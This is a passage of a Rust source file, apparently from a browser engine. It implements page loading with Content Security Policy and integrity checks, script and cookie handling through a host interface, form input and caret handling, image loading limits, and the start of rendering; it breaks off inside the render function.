//! A loaded page: DOM + stylesheets, and the render pipeline.

use crate::css::{self, Color, Stylesheet};
use crate::dom::Node;
use crate::image::{self, Decoded};
use crate::layout::{self, BoxKind, LayoutBox, Rect, TextFrag};
use crate::paint::{self, DisplayList};
use crate::select::TextRun;
use crate::style::{self, Float, Position, StyleContext};
use crate::{font, html, net};

use crate::forms::{self, Activation, Submission};
use crate::js::{self, Dom, Runtime};
use crate::net::{Dest, ScriptRequest};
use crate::network::ScriptResponse;
use std::cell::RefCell;
use std::collections::{HashMap, HashSet};
use std::sync::OnceLock;
use std::time::Instant;

pub struct Page {
    pub url: String,
    pub title: String,
    pub dom: Node,
    pub sheets: Vec<Stylesheet>,
    /// Hiding rules from the content blocker. Applied with user-level
    /// priority, so pages can't override them with `!important`.
    pub blocker: Stylesheet,
    /// Scripts ran on this page (so `<noscript>` content is hidden).
    pub scripting: bool,
    /// External stylesheets fetched so far, by URL.
    sheet_cache: HashMap<String, Stylesheet>,
    policy: crate::csp::Csp,
    /// Boxes from the last layout and the node each is for, in paint
    /// order, for finding what a click hit.
    hits: RefCell<Vec<(Rect, u32)>>,
    /// The same boxes unclipped, by node, for scripts.
    script_boxes: RefCell<Vec<(u32, Rect)>>,
    /// How far you've scrolled inside boxes, by node.
    scrolled: RefCell<HashMap<u32, (f32, f32)>>,
    /// The boxes you could scroll inside at the last layout.
    scrollers: RefCell<Vec<layout::ScrollBox>>,
    /// The page's editable DOM when it has no scripts (with scripts, the
    /// script runtime holds it). Typing and form controls change it.
    arena: Option<Dom>,
    /// The form control that has the keyboard, and the caret in it.
    pub focus: Option<u32>,
    caret: forms::Caret,
    /// The `<select>` showing its options.
    open_select: Option<u32>,
    /// Images by URL: decoded, or `None` if they couldn't be loaded.
    images: HashMap<String, Option<Decoded>>,
    /// Bytes of decoded pixels kept in `images`.
    image_bytes: usize,
    /// Your text size (see `StyleContext::text_scale`).
    pub text_scale: f32,
    /// Size of the tab bar's text in px: [`Rendered::title`] is drawn at
    /// it (0 = not wanted).
    pub title_px: f32,
    /// Where the page's `<meta http-equiv="refresh">` sends you, as an
    /// absolute URL (the browser applies its checks, like a script's
    /// navigation).
    pub redirect: Option<String>,
    /// With scripts: the files (absolute URLs) the document as the server
    /// sent it refers to. Others were put there by scripts.
    from_server: Option<HashSet<String>>,
}

/// Decoded image pixels a page may keep (the renderer has 4 GB in all).
const MAX_IMAGE_MEMORY: usize = 512 * 1024 * 1024;

/// What a click or keystroke on the page did.
#[derive(Debug, Clone, Default, PartialEq)]
pub struct Interaction {
    /// A script called `preventDefault()` on a click: don't follow a link.
    pub prevented: bool,
    /// The page changed and needs a new layout.
    pub changed: bool,
    /// A form was submitted: the browser should go here.
    pub submit: Option<Submission>,
    /// A form control has the keyboard.
    pub focus: bool,
    /// Text you copied or cut from a field, for the clipboard.
    pub copied: Option<String>,
}

/// A key that does something in a form control. `select` is Shift held
/// (extending the selection), `word` is Ctrl (by words).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Key {
    Backspace { word: bool },
    Delete { word: bool },
    Enter,
    Tab,
    Escape,
    Left { select: bool, word: bool },
    Right { select: bool, word: bool },
    Home { select: bool },
    End { select: bool },
    Up { select: bool },
    Down { select: bool },
    SelectAll,
    Copy,
    Cut,
}

/// What scripts left behind while a page loaded.
#[derive(Debug, Default)]
pub struct ScriptOutput {
    pub console: Vec<String>,
    /// Details of the browser the scripts read ([`crate::explain::FINGERPRINT`]).
    pub read: Vec<String>,
    /// A navigation a script asked for.
    pub navigate: Option<String>,
}

#[derive(Debug, Clone, PartialEq)]
pub struct Rendered {
    pub list: DisplayList,
    /// Glyph bitmaps the list's `Glyphs` commands refer to.
    pub atlas: Vec<paint::GlyphBitmap>,
    pub height: f32,
    pub background: Color,
    pub links: Vec<(Rect, String)>,
    /// The page's text in reading order, for selecting and copying it.
    pub texts: Vec<TextRun>,
    /// Fixed and sticky boxes: ranges of `list` the browser paints on top,
    /// moved for scrolling.
    pub layers: Vec<paint::Layer>,
    /// The page's title, drawn for the tab bar (see [`paint::text_mask`]).
    pub title: Option<paint::GlyphBitmap>,
    /// Boxes you can scroll inside, outer ones first.
    pub scrollers: Vec<Scroller>,
}

/// A box you can scroll inside: the wheel over it scrolls it (by
/// [`Page::scroll_box`]) before the page.
#[derive(Debug, Clone, Copy, PartialEq)]
pub struct Scroller {
    pub uid: u32,
    /// Where it shows on the page (its padding box, minus what's clipped
    /// away), as laid out.
    pub rect: Rect,
    /// How far it's scrolled, and how far it can be.
    pub x: f32,
    pub y: f32,
    pub max_x: f32,
    pub max_y: f32,
    /// The fixed or sticky layer it's in, which moves it as the page scrolls.
    pub layer: Option<paint::LayerKind>,
}

impl Scroller {
    /// Where it shows at page scroll `scroll`.
    pub fn at(&self, scroll: f32) -> Rect {
        let dy = self.layer.map_or(0.0, |kind| {
            paint::Layer {
                kind,
                bounds: Rect::default(),
                start: 0,
                end: 0,
            }
            .shift(scroll)
        });
        Rect {
            y: self.rect.y + dy,
            ..self.rect
        }
    }

    /// Can it scroll by (dx, dy) at all?
    pub fn can_scroll(&self, dx: f32, dy: f32) -> bool {
        (dx < 0.0 && self.x > 0.0)
            || (dx > 0.0 && self.x < self.max_x)
            || (dy < 0.0 && self.y > 0.0)
            || (dy > 0.0 && self.y < self.max_y)
    }
}

/// The innermost box at `(x, y)` (page space, at page scroll `scroll`) that
/// can scroll by `(dx, dy)`.
pub fn scroller_at(
    scrollers: &[Scroller],
    x: f32,
    y: f32,
    scroll: f32,
    dx: f32,
    dy: f32,
) -> Option<&Scroller> {
    scrollers
        .iter()
        .rev()
        .find(|s| s.at(scroll).contains(x, y) && s.can_scroll(dx, dy))
}

/// Fetches a subresource (absolute URL) for the page. In the sandboxed
/// renderer this asks the browser process, which applies the security policy.
pub type Fetcher<'f> = dyn FnMut(&str, Dest) -> Result<String, String> + 'f;
/// Fetches an image's bytes; told whether a script put it on the page.
type StyleFetcher<'f> = dyn FnMut(&str, &str, &[Vec<String>], Option<&str>) -> Result<String, String> + 'f;
pub type ImageFetcher<'f> = dyn FnMut(&str, bool) -> Result<Vec<u8>, String> + 'f;

/// The browser's side of a page while its scripts run: everything that
/// needs the network or the cookie jar is asked of it (over IPC in the
/// sandboxed renderer), and it applies the policy.
pub trait Host {
    /// A stylesheet or script file for the page.
    fn fetch(&mut self, url: &str, dest: Dest) -> Result<String, String>;
    /// A script's `fetch`/`XMLHttpRequest`.
    fn request(&mut self, url: &str, req: ScriptRequest) -> Result<ScriptResponse, String>;
    /// A stylesheet or script a script put on the page (the browser keeps
    /// those to the page's site).
    fn fetch_added(&mut self, url: &str, dest: Dest) -> Result<String, String> {
        self.fetch(url, dest)
    }
    /// An external script, `added` by a script or not. `csp`: source
    /// lists from the page's Content Security Policy that every redirect
    /// hop must match (the browser follows redirects, so it checks).
    fn fetch_script(&mut self, url: &str, added: bool, csp: &[Vec<String>]) -> Result<String, String> {
        let _ = csp;
        if added {
            self.fetch_added(url, Dest::Script)
        } else {
            self.fetch(url, Dest::Script)
        }
    }
    fn stylesheet(
        &mut self,
        url: &str,
        integrity: &str,
        _csp: &[Vec<String>],
        added: bool,
        _nonce: Option<&str>,
    ) -> Result<String, String> {
        let text = if added {
            self.fetch_added(url, Dest::Stylesheet)
        } else {
            self.fetch(url, Dest::Stylesheet)
        }?;
        if !crate::csp::integrity_matches(integrity, &text) {
            return Err("stylesheet integrity mismatch".into());
        }
        Ok(text)
    }
    fn image_policy(&mut self, url: &str, added: bool, _csp: &[Vec<String>]) -> Result<Vec<u8>, String> {
        if added {
            self.image_added(url)
        } else {
            self.image(url)
        }
    }
    /// An image's bytes.
    fn image(&mut self, url: &str) -> Result<Vec<u8>, String> {
        Err(format!("images are off, skipped {url}"))
    }
    /// An image a script put on the page.
    fn image_added(&mut self, url: &str) -> Result<Vec<u8>, String> {
        self.image(url)
    }
    /// A script set `document.cookie`.
    fn set_cookie(&mut self, value: &str);
    /// `document.cookie` as it stands.
    fn cookies(&mut self) -> String;
}

/// A [`Host`] that only serves files (no script requests or cookies).
pub struct FetchOnly<F>(pub F);

impl<F: FnMut(&str, Dest) -> Result<String, String>> Host for FetchOnly<F> {
    fn fetch(&mut self, url: &str, dest: Dest) -> Result<String, String> {
        (self.0)(url, dest)
    }
    fn request(&mut self, _: &str, _: ScriptRequest) -> Result<ScriptResponse, String> {
        Err("no network".into())
    }
    fn set_cookie(&mut self, _: &str) {}
    fn cookies(&mut self) -> String {
        String::new()
    }
}

/// Send scripts' queued requests and cookie changes to the browser and
/// hand back the answers, running the timers they set off, until nothing
/// is waiting (or time is up).
pub fn pump(rt: &mut Runtime, host: &mut dyn Host, until: Instant) {
    for _ in 0..100 {
        let sets = rt.take_cookie_sets();
        let reqs = rt.take_requests();
        if sets.is_empty() && reqs.is_empty() {
            return;
        }
        for v in &sets {
            host.set_cookie(v);
        }
        if !sets.is_empty() {
            rt.set_cookies(host.cookies());
        }
        for (id, url, req) in reqs {
            if Instant::now() >= until {
                rt.deliver(id, Err("the page's scripts ran out of time".into()));
                continue;
            }
            let r = host.request(&url, req);
            rt.set_cookies(host.cookies());
            rt.deliver(id, r);
        }
        rt.run_timers(until);
        if Instant::now() >= until {
            // Answer whatever is still queued so promises settle.
            for (id, _, _) in rt.take_requests() {
                rt.deliver(id, Err("the page's scripts ran out of time".into()));
            }
            return;
        }
    }
}

fn ua_sheet() -> &'static Stylesheet {
    static UA: OnceLock<Stylesheet> = OnceLock::new();
    UA.get_or_init(|| css::parse(&format!("{}\n{}", style::UA_CSS, forms::UA_CSS)))
}

impl Page {
    /// Parse a document without running scripts. External stylesheets are
    /// requested through `fetch`.
    pub fn parse(url: &str, src: &str, blocker_css: &str, fetch: &mut Fetcher) -> Page {
        let mut page = Page::empty(url, blocker_css, false);
        let arena = Dom::from_tree(&html::parse(src));
        page.policy.add_meta(&arena.to_tree());
        page.set_tree(arena.to_tree(), &mut |u, _, _, _| fetch(u, Dest::Stylesheet));
        page.arena = Some(arena);
        page
    }

    pub fn parse_with_policy(
        url: &str,
        src: &str,
        blocker_css: &str,
        headers: &[String],
        host: &mut dyn Host,
    ) -> Page {
        let tree = html::parse(src);
        let mut page = Page::empty(url, blocker_css, false);
        page.policy = crate::csp::Csp::from_headers(url, headers);
        page.policy.add_meta(&tree);
        let arena = Dom::from_tree(&tree);
        page.set_tree(arena.to_tree(), &mut |u, i, c, n| {
            host.stylesheet(u, i, c, false, n)
        });
        page.arena = Some(arena);
        page
    }

    /// Parse a document and run its scripts (only ever in the sandboxed
    /// renderer). Returns the page and the script runtime, which keeps the
    /// page alive for events.
    /// `csp`: the page's `Content-Security-Policy` headers; its scripts
    /// are held to them and to any `<meta http-equiv>` policy in the page.
    pub fn load_with_scripts(
        url: &str,
        src: &str,
        blocker_css: &str,
        viewport: (f32, f32),
        csp: &[String],
        host: &mut dyn Host,
    ) -> (Page, Option<Runtime>, ScriptOutput) {
        let tree = html::parse(src);
        let mut policy = crate::csp::Csp::new(url);
        for h in csp {
            policy.add(h);
        }
        let mut metas = Vec::new();
        tree.walk(&mut metas, &|n| {
            n.element().is_some_and(|e| {
                e.tag == "meta"
                    && e.attrs
                        .get("http-equiv")
                        .is_some_and(|h| h.trim().eq_ignore_ascii_case("content-security-policy"))
            })
        });
        for m in metas {
            if let Some(c) = m.element().and_then(|e| e.attrs.get("content")) {
                policy.add(c);
            }
        }
        // The server's own stylesheets, fetched before scripts can change
        // anything, and every file the document refers to.
        let mut first = Page::empty(url, blocker_css, true);
        first.policy = policy.clone();
        first.set_tree(tree.clone(), &mut |u, i, c, n| host.stylesheet(u, i, c, false, n));
        let from_server = first.files();
        let mut rt = match Runtime::new(&tree, url, viewport) {
            Ok(rt) => rt,
            Err(e) => {
                let mut page = Page::empty(url, blocker_css, false);
                page.policy = policy.clone();
                page.sheet_cache = first.sheet_cache;
                page.set_tree(tree, &mut |u, i, c, n| host.stylesheet(u, i, c, false, n));
                let out = ScriptOutput {
                    console: vec![format!("[brickle] {e}")],
                    read: vec![],
                    navigate: None,
                };
                return (page, None, out);
            }
        };
        rt.set_cookies(host.cookies());
        rt.set_csp(policy.clone());
        let until = Instant::now() + js::LOAD_BUDGET;
        let mut loader = ScriptLoader {
            fetched: 0,
            until,
            from_server: &from_server,
        };
        for (id, src, code) in rt.document_scripts() {
            if Instant::now() >= until {
                break;
            }
            loader.run(&mut rt, id, src, code, host, true);
            loader.run_pending(&mut rt, host);
            pump(&mut rt, host, until);
        }
        rt.fire_load();
        for _ in 0..3 {
            loader.run_pending(&mut rt, host);
            rt.run_timers(until);
            pump(&mut rt, host, until);
        }
        loader.run_pending(&mut rt, host);
        let mut page = Page::empty(url, blocker_css, true);
        page.policy = policy;
        page.sheet_cache = first.sheet_cache;
        page.set_tree(rt.tree(), &mut |u, i, c, n| {
            host.stylesheet(u, i, c, !from_server.contains(u), n)
        });
        page.from_server = Some(from_server);
        let out = ScriptOutput {
            console: rt.take_console(),
            read: rt.take_read(),
            navigate: rt.take_navigate(),
        };
        (page, Some(rt), out)
    }

    /// A page for an already-built tree (no subresources; for tests and
    /// fuzzing).
    pub fn from_tree(url: &str, tree: Node) -> Page {
        let mut page = Page::empty(url, "", true);
        page.set_tree(tree, &mut |_, _, _, _| Err("subresources disabled".into()));
        page
    }

    fn empty(url: &str, blocker_css: &str, scripting: bool) -> Page {
        Page {
            url: url.to_string(),
            title: String::new(),
            dom: html::parse(""),
            sheets: Vec::new(),
            blocker: css::parse(blocker_css),
            scripting,
            sheet_cache: HashMap::new(),
            policy: crate::csp::Csp::new(url),
            hits: RefCell::new(Vec::new()),
            script_boxes: RefCell::new(Vec::new()),
            scrolled: RefCell::new(HashMap::new()),
            scrollers: RefCell::new(Vec::new()),
            arena: None,
            focus: None,
            caret: forms::Caret::default(),
            open_select: None,
            images: HashMap::new(),
            image_bytes: 0,
            text_scale: 1.0,
            title_px: 0.0,
            redirect: None,
            from_server: None,
        }
    }

    /// Fetch and decode the document's images not tried yet. Decoding
    /// uses the local decoder only in the explicit in-process backend.
    /// The sandboxed renderer uses `load_images_decoded` and disposable workers.
    /// `fetch` is told whether a script put the image there.
    pub fn image_sources(&self) -> Vec<Vec<String>> {
        self.policy.resource_sources(Dest::Image)
    }

    pub fn load_images(&mut self, fetch: &mut ImageFetcher) {
        self.load_images_decoded(&mut |url, added| {
            let bytes = match data_url(url) {
                Some(b) => b,
                None if url.starts_with("data:") => Err("unsupported data: address".into()),
                None => fetch(url, added),
            }?;
            image::decode(&bytes)
        });
    }

    pub fn load_images_decoded(&mut self, fetch: &mut dyn FnMut(&str, bool) -> Result<Decoded, String>) {
        let mut imgs = Vec::new();
        self.dom.walk(&mut imgs, &|n| n.tag() == Some("img"));
        let mut urls: Vec<String> = imgs
            .iter()
            .filter_map(|n| n.element().and_then(|e| image_source(&self.url, e)))
            .collect();
        // CSS background images, after the page's own images.
        urls.extend(self.background_urls());
        for url in urls {
            if !self.policy.resource(Dest::Image, &url)
                || self.images.contains_key(&url)
                || self.images.len() >= crate::network::MAX_IMAGES
            {
                continue;
            }
            let decoded = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
                fetch(&url, self.from_server.as_ref().is_some_and(|s| !s.contains(&url)))
            }))
            .ok()
            .and_then(Result::ok);
            let decoded = decoded.filter(|d| {
                let n = d.bitmap.rgba.len();
                if self.image_bytes + n > MAX_IMAGE_MEMORY {
                    return false;
                }
                self.image_bytes += n;
                true
            });
            self.images.insert(url, decoded);
        }
    }

    /// Decoded images for the `<img>` elements in `tree`, by node.
    /// Every file the document refers to, absolute: images, stylesheets
    /// and scripts, and `url()`s in its stylesheets.
    fn files(&self) -> HashSet<String> {
        let mut out = HashSet::new();
        let mut els = Vec::new();
        self.dom
            .walk(&mut els, &|n| matches!(n.tag(), Some("img" | "link" | "script")));
        for e in els.iter().filter_map(|n| n.element()) {
            let href = match e.tag.as_str() {
                "img" => image_source(&self.url, e),
                "link" => e.attrs.get("href").map(|h| net::resolve(&self.url, h)),
                _ => e.attrs.get("src").map(|s| net::resolve(&self.url, s)),
            };
            out.extend(href);
        }
        for s in &self.sheets {
            out.extend(css::urls(s).map(|u| net::resolve(&self.url, u)));
        }
        out
    }

    /// The `background-image`s the page's elements use, absolute.
    fn background_urls(&self) -> Vec<String> {
        let mut all = vec![(0u8, ua_sheet())];
        all.extend(self.sheets.iter().map(|s| (1u8, s)));
        let ctx = StyleContext {
            text_scale: 1.0,
            sheets: all,
            viewport: (1024.0, 768.0),
        };
        let styled = style::style_tree(&self.dom, &ctx);
        fn walk(n: &style::StyledNode, base: &str, out: &mut Vec<String>) {
            if let Some(u) = &n.style.background_image {
                if n.node.element().is_some() && n.style.display != style::Display::None {
                    let u = net::resolve(base, u);
                    if !out.contains(&u) && out.len() < crate::network::MAX_IMAGES {
                        out.push(u);
                    }
                }
            }
            for c in &n.children {
                walk(c, base, out);
            }
        }
        let mut out = Vec::new();
        walk(&styled, &self.url, &mut out);
        out
    }

    fn images_by_node(&self, tree: &Node) -> HashMap<u32, Decoded> {
        let mut imgs = Vec::new();
        tree.walk(&mut imgs, &|n| n.tag() == Some("img"));
        imgs.iter()
            .filter_map(|n| {
                let url = image_source(&self.url, n.element()?)?;
                let d = self.images.get(&url)?.clone()?;
                Some((n.uid, d))
            })
            .collect()
    }

    /// Use `dom` as the page's document: collect its stylesheets (fetching
    /// external ones not seen before) and title.
    fn set_tree(&mut self, mut dom: Node, fetch: &mut StyleFetcher) {
        strip_inline_styles(&mut dom, &self.policy);
        let mut sheets = Vec::new();
        let mut found = Vec::new();
        let scripting = self.scripting;
        collect_style_elements(&dom, scripting, &mut found);
        for n in found {
            let Some(e) = n.element() else { continue };
            if e.tag == "style" {
                if self.policy.style_inline(
                    e.attrs.get("nonce").map(String::as_str),
                    &n.text_content(),
                    false,
                ) {
                    sheets.push(css::parse(&n.text_content()));
                }
            } else if e
                .attrs
                .get("rel")
                .is_some_and(|r| r.to_ascii_lowercase().contains("stylesheet"))
            {
                if let Some(href) = e.attrs.get("href") {
                    let media = e
                        .attrs
                        .get("media")
                        .map(|m| m.to_ascii_lowercase())
                        .unwrap_or_default();
                    if media.contains("print") {
                        continue;
                    }
                    let abs = net::resolve(&self.url, href);
                    let nonce = e.attrs.get("nonce").map(String::as_str);
                    if !self.policy.style_link(nonce, &abs) {
                        continue;
                    }
                    let integrity = e.attrs.get("integrity").map_or("", String::as_str);
                    let key = format!("{abs}\n{integrity}");
                    if let Some(s) = self.sheet_cache.get(&key) {
                        sheets.push(s.clone());
                    } else if let Ok(text) = data_css(&abs)
                        .unwrap_or_else(|| fetch(&abs, integrity, &self.policy.style_sources(nonce), nonce))
                    {
                        if !crate::csp::integrity_matches(integrity, &text) {
                            continue;
                        }
                        // Failures are shown in the request log.
                        let mut s = css::parse(&text);
                        css::resolve_urls(&mut s, &abs);
                        self.sheet_cache.insert(key, s.clone());
                        sheets.push(s);
                    }
                }
            }
        }
        if scripting {
            sheets.push(css::parse("noscript { display: none }"));
        }
        let mut titles = Vec::new();
        dom.walk(&mut titles, &|n| n.tag() == Some("title"));
        self.title = titles
            .first()
            .map(|t| t.text_content().split_whitespace().collect::<Vec<_>>().join(" "))
            .unwrap_or_default();
        self.redirect = meta_refresh(&dom, scripting)
            .and_then(|c| refresh_url(&c))
            .map(|to| net::resolve(&self.url, &to));
        self.sheets = sheets;
        self.dom = dom;
    }

    /// After scripts changed the DOM (in response to an event): take the new
    /// tree. Stylesheets not fetched while loading aren't fetched now.
    pub fn refresh(&mut self, rt: &Runtime) {
        self.set_tree(rt.tree(), &mut |_, _, _, _| Err("page already loaded".into()));
    }

    /// Run `f` on the page's editable DOM: the script runtime's, or the
    /// page's own.
    fn with_dom<R>(&mut self, rt: Option<&mut Runtime>, f: impl FnOnce(&mut Dom) -> R) -> Option<R> {
        match rt {
            Some(rt) => Some(rt.with_dom(f)),
            None => self.arena.as_mut().map(f),
        }
    }

    fn dom_version(&mut self, rt: Option<&mut Runtime>) -> u64 {
        self.with_dom(rt, |d| d.version).unwrap_or(0)
    }

    /// After the editable DOM changed: take the new tree.
    fn sync(&mut self, rt: Option<&mut Runtime>) {
        let tree = match rt {
            Some(rt) => rt.tree(),
            None => match &self.arena {
                Some(a) => a.to_tree(),
                None => return,
            },
        };
        self.set_tree(tree, &mut |_, _, _, _| Err("page already loaded".into()));
    }

    /// Submit `form` (as if by `submitter`): scripts first get a `submit`
    /// event they can cancel.
    fn submit(
        &mut self,
        mut rt: Option<&mut Runtime>,
        form: u32,
        submitter: Option<u32>,
    ) -> Option<Submission> {
        if let Some(rt) = rt.as_deref_mut() {
            if rt.fire(form, "submit", true, true) {
                return None;
            }
        }
        let url = self.url.clone();
        self.with_dom(rt, |d| forms::submission(d, form, submitter, &url))
            .flatten()
    }

    /// You clicked the page at page-space (x, y).
    pub fn click_at(&mut self, mut rt: Option<&mut Runtime>, x: f32, y: f32, until: Instant) -> Interaction {
        let mut out = Interaction::default();
        let before = self.dom_version(rt.as_deref_mut());
        let hit = self.hit(x, y);
        // With a select's options showing, a click picks one or closes
        // them; it does nothing else.
        if let Some(sel) = self.open_select.take() {
            let picked = hit.and_then(|uid| {
                self.with_dom(rt.as_deref_mut(), |d| {
                    (forms::select_of(d, uid) == Some(sel) && forms::choose_option(d, sel, uid))
                        .then_some(sel)
                })
                .flatten()
            });
            if let (Some(sel), Some(rt)) = (picked, rt.as_deref_mut()) {
                rt.fire(sel, "input", true, false);
                rt.fire(sel, "change", true, false);
            }
            let was = self.focus;
            self.finish(rt, before, was, &mut out);
            out.changed = true;
            return out;
        }
        let Some(uid) = hit else {
            self.focus = None;
            return out;
        };
        if let Some(rt) = rt.as_deref_mut() {
            out.prevented = rt.click(uid, until).prevented;
        }
        let control = self
            .with_dom(rt.as_deref_mut(), |d| forms::control_at(d, uid))
            .flatten();
        let was_focus = self.focus;
        self.focus = None;
        if let (Some(c), false) = (control, out.prevented) {
            match self.with_dom(rt.as_deref_mut(), |d| forms::activate(d, c)) {
                Some(Activation::Focus(f)) => {
                    self.focus = Some(f);
                    if was_focus != Some(f) {
                        if let Some(c) = self.with_dom(rt.as_deref_mut(), |d| forms::Caret::at_end(d, f)) {
                            self.caret = c;
                        }
                        if let Some(rt) = rt.as_deref_mut() {
                            rt.fire(f, "focus", false, false);
                        }
                    }
                }
                Some(Activation::Changed(c)) => {
                    if let Some(rt) = rt.as_deref_mut() {
                        rt.fire(c, "input", true, false);
                        rt.fire(c, "change", true, false);
                    }
                }
                Some(Activation::Open(c)) => {
                    self.focus = Some(c);
                    self.open_select = Some(c);
                    out.changed = true;
                }
                Some(Activation::Submit { form, submitter }) => {
                    out.submit = self.submit(rt.as_deref_mut(), form, Some(submitter));
                }
                _ => {}
            }
        } else if !out.prevented {
            let toggled = self
                .with_dom(rt.as_deref_mut(), |d| forms::toggle_details(d, uid))
                .flatten();
            if let (Some(d), Some(rt)) = (toggled, rt.as_deref_mut()) {
                rt.fire(d, "toggle", false, false);
            }
        }
        self.finish(rt, before, was_focus, &mut out);
        out
    }

    /// You typed text into the focused field (or pasted it).
    pub fn type_text(&mut self, mut rt: Option<&mut Runtime>, text: &str) -> Interaction {
        let mut out = Interaction::default();
        let Some(f) = self.focus else { return out };
        let before = self.dom_version(rt.as_deref_mut());
        let mut caret = self.caret;
        let typed = self.with_dom(rt.as_deref_mut(), |d| forms::insert(d, f, &mut caret, text)) == Some(true);
        self.caret = caret;
        if typed {
            if let Some(rt) = rt.as_deref_mut() {
                rt.fire(f, "input", true, false);
            }
        }
        self.finish(rt, before, Some(f), &mut out);
        out
    }

    /// You pressed a key with a form control focused.
    pub fn key(&mut self, mut rt: Option<&mut Runtime>, key: Key) -> Interaction {
        use forms::Move;
        let mut out = Interaction::default();
        let before = self.dom_version(rt.as_deref_mut());
        let (was, was_open, mut caret) = (self.focus, self.open_select, self.caret);
        let is = |p: &mut Page, rt: Option<&mut Runtime>, f: u32, tag: &str| {
            p.with_dom(rt, |d| d.element(f).is_some_and(|e| e.tag == tag))
                .unwrap_or(false)
        };
        // The value changed by editing, or a select's choice changed.
        let (mut input, mut change) = (false, false);
        match (key, self.focus) {
            (Key::Escape, _) => {
                if self.open_select.take().is_none() {
                    self.focus = None;
                }
            }
            (Key::Enter, Some(f)) if self.open_select == Some(f) => self.open_select = None,
            (Key::Up { .. } | Key::Down { .. }, Some(f)) if is(self, rt.as_deref_mut(), f, "select") => {
                let down = matches!(key, Key::Down { .. });
                change = self.with_dom(rt.as_deref_mut(), |d| forms::step_option(d, f, down)) == Some(true);
                input = change;
            }
            (Key::Backspace { word } | Key::Delete { word }, Some(f)) => {
                let forward = matches!(key, Key::Delete { .. });
                input = self.with_dom(rt.as_deref_mut(), |d| {
                    forms::delete(d, f, &mut caret, forward, word)
                }) == Some(true);
            }
            (Key::Enter, Some(f)) => {
                if is(self, rt.as_deref_mut(), f, "textarea") {
                    input = self.with_dom(rt.as_deref_mut(), |d| forms::insert(d, f, &mut caret, "\n"))
                        == Some(true);
                } else if let Some((form, submitter)) = self
                    .with_dom(rt.as_deref_mut(), |d| forms::implicit_submit(d, f))
                    .flatten()
                {
                    if let Some(rt) = rt.as_deref_mut() {
                        rt.fire(f, "change", true, false);
                    }
                    out.submit = self.submit(rt.as_deref_mut(), form, submitter);
                }
            }
            (
                Key::Left { select, .. }
                | Key::Right { select, .. }
                | Key::Home { select }
                | Key::End { select }
                | Key::Up { select }
                | Key::Down { select },
                Some(f),
            ) => {
                let m = match key {
                    Key::Left { word, .. } => Move::Left { word },
                    Key::Right { word, .. } => Move::Right { word },
                    Key::Home { .. } => Move::Home,
                    Key::End { .. } => Move::End,
                    Key::Up { .. } => Move::Up,
                    _ => Move::Down,
                };
                self.with_dom(rt.as_deref_mut(), |d| {
                    forms::move_caret(d, f, &mut caret, m, select)
                });
            }
            (Key::SelectAll, Some(f)) => {
                self.with_dom(rt.as_deref_mut(), |d| forms::select_all(d, f, &mut caret));
            }
            (Key::Copy | Key::Cut, Some(f)) => {
                out.copied = self
                    .with_dom(rt.as_deref_mut(), |d| forms::selected_text(d, f, &caret))
                    .flatten();
                if key == Key::Cut && out.copied.is_some() {
                    input = self.with_dom(rt.as_deref_mut(), |d| forms::insert(d, f, &mut caret, ""))
                        == Some(true);
                }
            }
            (Key::Tab, _) => {
                self.open_select = None;
                self.focus = self
                    .with_dom(rt.as_deref_mut(), |d| forms::next_field(d, was))
                    .flatten();
                if let Some(f) = self.focus {
                    caret = self
                        .with_dom(rt.as_deref_mut(), |d| forms::Caret::at_end(d, f))
                        .unwrap_or_default();
                }
            }
            _ => {}
        }
        if let (Some(f), Some(rt)) = (self.focus, rt.as_deref_mut()) {
            if input {
                rt.fire(f, "input", true, false);
            }
            if change {
                rt.fire(f, "change", true, false);
            }
        }
        let moved = caret != self.caret || self.open_select != was_open;
        self.caret = caret;
        self.finish(rt, before, was, &mut out);
        out.changed |= moved;
        out
    }

    /// Common end of an interaction: `form.submit()` from scripts, new
    /// layout if anything changed.
    fn finish(
        &mut self,
        mut rt: Option<&mut Runtime>,
        before: u64,
        was_focus: Option<u32>,
        out: &mut Interaction,
    ) {
        if out.submit.is_none() {
            if let Some((form, submitter)) = rt.as_deref_mut().and_then(|r| r.take_submit()) {
                let url = self.url.clone();
                out.submit = self
                    .with_dom(rt.as_deref_mut(), |d| forms::submission(d, form, submitter, &url))
                    .flatten();
            }
        }
        let changed = self.dom_version(rt.as_deref_mut()) != before;
        if changed {
            self.sync(rt);
        }
        out.changed = changed || self.focus != was_focus;
        out.focus = self.focus.is_some();
    }

    /// The node under a page-space point, from the last layout.
    pub fn hit(&self, x: f32, y: f32) -> Option<u32> {
        self.hits
            .borrow()
            .iter()
            .rev()
            .find(|(r, uid)| *uid != 0 && r.contains(x, y))
            .map(|(_, u)| *u)
    }

    /// Boxes of the last layout, by node, for scripts' `getBoundingClientRect`.
    pub fn boxes(&self) -> Vec<(u32, Rect)> {
        self.script_boxes.borrow().clone()
    }

    /// Parse a document we generated ourselves (error pages); no subresources.
    pub fn trusted(url: &str, src: &str) -> Page {
        Page::parse(url, src, "", &mut |_, _| Err("subresources disabled".into()))
    }

    pub fn render(&self, width: f32, viewport_h: f32) -> Rendered {
        let mut all = vec![(0u8, ua_sheet())];
        all.extend(self.sheets.iter().map(|s| (1u8, s)));
        all.push((3u8, &self.blocker));
        let ctx = StyleContext {
            text_scale: self.text_scale,
            sheets: all,
            viewport: (width, viewport_h),
        };
        // Form controls get their value, label or placeholder to draw.
        let mut tree = self.dom.clone();
        forms::decorate(
            &mut tree,
            &forms::Decor {
                focus: self.focus,
                caret: self.caret,
                open: self.open_select,
            },
        );
        let images = self.images_by_node(&tree);
        let styled = style::style_tree(&tree, &ctx);
        let mut root = layout::layout_tree_with_images(&styled, (width, viewport_h), &images);
        let scroll_boxes = layout::apply_scrolling(&mut root, &self.scrolled.borrow());

        // The root's (or body's) background paints the whole canvas.
        let mut background = styled.style.background;
        if background.a == 0 {
            if let Some(body) = styled.children.iter().find(|c| c.node.tag() == Some("body")) {
                background = body.style.background;
            }
        }
        if background.a == 0 {
            background = Color::WHITE;
        }

        let backgrounds = |u: &str| self.images.get(&net::resolve(&self.url, u)).cloned().flatten();
        let (ops, layer_ops) = paint::build_layered(&root, &backgrounds);
        let (list, atlas, starts) = paint::rasterize_indexed(ops);
        let layers = layer_ops
            .into_iter()
            .map(|(kind, bounds, r)| paint::Layer {
                kind,
                bounds,
                start: starts[r.start],
                end: starts[r.end],
            })
            .collect();
        let mut links = Vec::new();
        let order = layout::paint_order(&root);
        // What's clipped away can't be clicked either.
        let clips = layout::clip_map(&root);
